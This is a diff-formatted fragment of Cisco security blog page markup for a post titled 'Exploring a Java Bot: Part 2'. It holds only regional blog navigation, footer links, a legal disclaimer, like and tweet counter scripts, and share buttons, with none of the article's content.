+    <div class = "col_2">
+    <li><a href="https://gblogs.cisco.com/fin/">Finland</a>
+    <li><a href="https://gblogs.cisco.com/fr/">France</a>
+
+  <li><a href="https://gblogs.cisco.com/de">Germany</a></li>
+  <li><a href="https://gblogs.cisco.com/gr/">Greece</a>
+  <li><a href="https://gblogs.cisco.com/in">India</a></li>
+  <li><a href="https://gblogs.cisco.com/it/">Italy</a></li>
+  <li><a href="https://gblogs.cisco.com/jp/">Japan</a></li>
+  <li><a href="https://ciscokrblog.com/">Korea</a></li>
+
+  </div>
+  <div class = "col_3">
+  <li><span class = "sub_main">Latin America</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/la/">Latin America (Esp)</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/cansac/">Cansac</a></li>
+  <li><a href="https://gblogs.cisco.com/nl/">Netherlands</a></li>
+  <li><a href="https://gblogs.cisco.com/no">Norway</a></li>
+  <li><a href="https://gblogs.cisco.com/pl">Poland</a></li>
+  <li><a href="https://gblogs.cisco.com/pt">Portugal</a></li>
+  <li><a href="https://gblogs.cisco.com/ro">Romania</a></li>
+  </div>
+
+  <div class = "col_4">
+  <li><a href="https://gblogs.cisco.com/ru">Russia</a></li>
+  <li><a href="https://gblogs.cisco.com/es">Spain</a></li>
+  <li><span class = "sub_main">Switzerland</span></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-tech/">English</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-fr/">French</a></li>
+      <li class = "sub"><a href="https://gblogs.cisco.com/ch-de/">German</a></li>
+  <li><a href="https://gblogs.cisco.com/tr/">Turkey</a></li>
+  <li><a href="https://gblogs.cisco.com/uki/">UK &amp; Ireland</a></li>
+</div>
+<div class = "clear"></div>
+</ul>
+</li>
+      </ul>
+</nav>
+</div>
+<footer class = "sb-slide">
+	<section id = "footer_content">
+				<ul id = "footer_social">
+			<li class = "footer_social_title">Connect</li>
+
+			<li><a target='_blank' href='https://www.facebook.com/ciscosecurity?ref=nf'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_fb.png" height = "25" width = "25"></a></li>
+			<li><a target='_blank' href='https://twitter.com/ciscosecurity'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_tw.png"></a></li>
+			<li><a target='_blank' href='http://www.linkedin.com/company/cisco'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_li.png"></a></li>
+			<li><a target='_blank' href='https://plus.google.com/106092229730683979920'><img src = "https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/footer_gp.png"></a></li>
+			<div class = "clear"></div>
+
+		</ul>
+
+
+		<section id="footer_new">
+			<ul>
+				<li><a href="https://www.cisco.com/web/siteassets/contacts/index.html">Contacts</a>  |  </li>
+				<li><a href="https://secure.opinionlab.com/ccc01/o.asp?id=jBjOhqOJ">Feedback</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/help/index.html">Help</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/sitemap/index.html">Site Map</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/legal/terms_condition.html">Terms &amp; Conditions</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/legal/privacy.html">Privacy Statement</a>  |  </li>
+				<li><a href="https://www.cisco.com/web/siteassets/legal/privacy.html#cookies">Cookie Policy</a>  |  </li>
+    	 		<li><a href="https://www.cisco.com/web/siteassets/legal/trademark.html">Trademarks</a> <br /> </li>
+    	 	</ul>
+		</section>
+		<br class="clear" />
+    	<section id ="disclaimer">
+    		<b>Legal Disclaimer</b>
+			<p>Some of the individuals posting to this site, including the moderators, work for Cisco Systems. Opinions expressed here and in any corresponding comments are the personal opinions of the original authors, not of Cisco. The content is provided for informational purposes only and is not meant to be an endorsement or representation by Cisco or any other party. This site is available to the public. No information you consider confidential should be posted to this site. By posting you agree to be solely responsible for the content of all information you contribute, link to, or otherwise upload to the Website and release Cisco from any liability related to your use of the Website. You also grant to Cisco a worldwide, perpetual, irrevocable, royalty-free and fully-paid, transferable (including rights to sublicense) right to exercise all copyright, publicity, and moral rights with respect to any original content you provide. The comments are moderated. Comments will appear as soon as they are approved by the moderator.</p>
+    	</section>
+	</section>
+	<script>
+var ajaxurl = "https://blogs.cisco.com/wp-admin/admin-ajax.php";
+jQuery(document).ready(function($) {
+
+	$('a.commentLikeButton').click(function(event){
+		var elemId = event.target.id;
+		var commentId = elemId.replace('clickLike','');
+
+		event.preventDefault();
+
+		var nitroID= $(this).attr("data-nitro");
+
+
+
+		var str = $(this).text();
+		if (str =='1 like') {
+			var total = str.replace('like','');
+		}
+		else {
+			var total = str.replace('likes','');
+		}
+		if ($(this).hasClass( "commentlike")) {
+			var theTotal = parseInt(total);
+   			theTotal1 = Number(theTotal) + 1;
+   			if (theTotal1 === 1){
+   				$(this).text(theTotal1+" like"); 
+   			}
+   			else {
+    			$(this).text(theTotal1+" likes");
+    		}
+    		var data = {
+        		'action': 'addLike',
+				'commentID': commentId,
+				'total': theTotal1
+			};
+
+
+			$.post(ajaxurl, data, function(response) {
+				if (typeof nitroID !== 'undefined') {
+					commentLike(nitroID);
+				}
+				commentLiked();
+			});
+
+    	}
+    	else{
+    		$(this).removeAttr("href");
+    		alert('You already liked this');
+    		/*var theTotal = parseInt(total);
+   			theTotal = Number(theTotal) - 1;
+   			if (theTotal == 1){
+   				$(this).text(theTotal+" like");
+   			}
+   			else {
+    			$(this).text(theTotal+" likes");
+    		}
+    		var data = {
+        		'action': 'removeLike',
+				'commentID': commentId,
+				'total': theTotal
+			};
+			$.post(ajaxurl, data, function(response) {
+				alert('disliked');
+			});*/
+    	}
+
+    	$(this).addClass('commentliked').removeClass('commentlike');
+	});
+});
+
+
+
+
+
+	</script>
+	
+	<script>
+		var ajaxurl = "https://blogs.cisco.com/wp-admin/admin-ajax.php";
+		
+		jQuery(document).ready(function($) {
+			var postID = 12908;
+			var orig_count = 0;
+			$(".twitter a").click(function() {
+
+				var theTotal = orig_count;
+   				var count = Number(theTotal) + 1;
+				var data = {
+        			'action': 'addtweet',
+					'postID': postID,
+					'total': count
+				};
+				$.post(ajaxurl, data, function(response){});
+			})
+		});
+	</script>
+
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/comment-reply.min.js?ver=4.9.2'></script>
+<script type='text/javascript' src='https://blogs.cisco.com/wp-includes/js/wp-embed.min.js?ver=4.9.2'></script>
+</footer>
+<script>//nitro.refreshNML();</script>
+
+
+
+
+</body>
+</html>
+
+  <div id="share_bar1">
+
+    <span class = "share_title">Share</span>
+    <div class="twitter sharrre">
+      <div class = "box">
+        <div class = "count twitcount"></div>
+        <a class = "twitclick" href="https://twitter.com/intent/tweet?url=http://bit.ly/1zVfiLx&text=Exploring a Java Bot: Part 2&via=ciscosecurity" data-config-metrics-group='social_shares' data-config-metrics-title='twitter_shares' data-config-metrics-item='twitter_share'>tweet</a>
+      </div>
+    </div>
+
+    <div class="facebook sharrre">
+      <div class = "box">
+        <div class = "count fbcount"></div>
+        <a class = "fbclick share" href = "http://www.facebook.com/sharer/sharer.php?u=https://blogs.cisco.com/security/exploring-a-java-bot-part-2&title=Exploring a Java Bot: Part 2" data-config-metrics-group='social_shares' data-config-metrics-title='facebook_shares' data-config-metrics-item='facebook_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+
+
+    <div class="linkedin sharrre">
+      <div class = "box">
+        <div class = "count licount"></div>
+        <a class = "liclick share" href = "https://www.linkedin.com/cws/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-2" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='linkedin_shares' data-config-metrics-item='linkedin_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+
+
+      </div>
+    </div>
+
+    <div class="googleplus sharrre">
+      <div class = "box">
+        <div class = "count gpcount"></div>
+        <a class = "gpclick share" href="https://plus.google.com/share?url=https://blogs.cisco.com/security/exploring-a-java-bot-part-2" data-title=" " data-config-metrics-group='social_shares' data-config-metrics-title='google_shares' data-config-metrics-item='google_share' onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600');return false;"></a>
+      </div>
+    </div>
+        <div class = "share_mail"><a class="email emclick" href="mailto:?subject=Cisco Blog: Exploring a Java Bot: Part 2&body=I saw this post on Cisco Security blog and thought you might like to read it.%0A%0AExploring a Java Bot: Part 2%0A%0Ahttps://blogs.cisco.com/security/exploring-a-java-bot-part-2%0A%0A****Disclaimer****%0A%0ACisco is not responsible for the content of this email, and its contents do not necessarily reflect Cisco’s views or opinions. Cisco has not verified the email address or name of the sender." data-config-metrics-group='social_shares' data-config-metrics-title='email_shares' data-config-metrics-item='email_share'></a></div>
+    <div class = "clear"></div>
+  </div>
+  
